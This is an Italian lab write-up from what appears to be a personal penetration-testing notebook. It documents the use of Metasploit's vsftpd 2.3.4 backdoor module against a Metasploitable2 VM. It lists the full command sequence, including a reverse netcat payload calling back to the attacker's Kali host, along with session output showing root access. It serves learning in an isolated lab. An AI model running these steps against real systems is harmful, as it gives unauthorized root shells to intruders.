# 02 — Exploitation: vsftpd 2.3.4 Backdoor via Metasploit

## Categoria
Red Team / Exploitation / Metasploit Framework

## Obiettivo
Sfruttare la backdoor del server FTP vsftpd 2.3.4 usando
Metasploit Framework per ottenere una shell root sul target.

## Background — La Storia di questa Backdoor
Nel luglio 2011 qualcuno compromise il repository ufficiale
di vsftpd e inserì una backdoor nel codice sorgente v2.3.4.
Il trigger: inviare un username contenente ":)" fa aprire
una shell root sulla porta 6200. CVE non assegnato — fu
scoperto e rimosso in 3 giorni, ma chi aveva già scaricato
quella versione era compromesso.

## Ambiente

| Ruolo | VM | IP | Porta |
|---|---|---|---|
| Attacker | Kali Linux | 10.10.10.100 | 4444 (listener) |
| Target | Metasploitable2 | 10.10.10.101 | 21 (FTP) |

## Tool
**Metasploit Framework v6.4.116** — preinstallato su Kali.

## Procedura Completa

### 1 — Avvio Metasploit
```bash
msfconsole
```
![msfconsole avvio](screenshots/msf-01-msfconsole-avvio.png)

### 2 — Ricerca e Selezione Modulo
```
msf > search vsftpd
msf > use exploit/unix/ftp/vsftpd_234_backdoor
```
Il modulo ha rank **excellent** — affidabilità massima.

![Search e use modulo](screenshots/msf-02-search-use-modulo.png)

### 3 — Configurazione Opzioni
msf exploit(...) > show options
![Show options](screenshots/msf-03-show-options.png)

Opzioni richieste:
- `RHOSTS` — IP target
- `LHOST` — IP Kali (necessario per reverse shell)
- `PAYLOAD` — tipo di shell

### 4 — Errore Incontrato: LHOST Mancante

Primo tentativo senza LHOST:
[-] Msf::OptionValidateError: LHOST required
![Errore LHOST](screenshots/msf-04-errore-lhost.png)

**Causa:** payload reverse shell richiede LHOST — il target
deve sapere dove connettersi. Risolto cambiando payload e
impostando LHOST esplicitamente.

### 5 — Configurazione Corretta ed Exploit
```
msf exploit(...) > set PAYLOAD cmd/unix/reverse_netcat
msf exploit(...) > set LHOST 10.10.10.100
msf exploit(...) > set RHOSTS 10.10.10.101
msf exploit(...) > run
```

Output:
```
[*] Started reverse TCP handler on 10.10.10.100:4444
[+] 10.10.10.101:21 - Backdoor has been spawned!
[*] Command shell session 1 opened (10.10.10.100:4444 → 10.10.10.101:33087)
```

### 6 — Verifica Shell Root
```bash
whoami    # root
id        # uid=0(root) gid=0(root)
hostname  # metasploitable
uname -a  # Linux metasploitable 2.6.24-16-server i686
```

![Shell root ottenuta](screenshots/msf-05-shell-root-ottenuta.png)

## Confronto con Exploit Precedente

| Aspetto | nc porta 1524 | Metasploit vsftpd |
|---|---|---|
| Tool | netcat | Metasploit Framework |
| Tipo | Bind shell | Reverse shell |
| Connessione | Kali → Target | Target → Kali |
| Complessità | Minima | Media |

## Lezioni Imparate
- Metasploit richiede LHOST per payload reverse shell
- La raw shell non mostra prompt — non significa che sia bloccata
- Rank "excellent" = exploit stabile e affidabile
- Il payload giusto dipende dall'OS target: Metasploitable2
  è vecchio i686, `cmd/unix/reverse_netcat` è più compatibile
  del meterpreter moderno

## Snapshot
`03-kali-vsftpd-exploit-metasploit`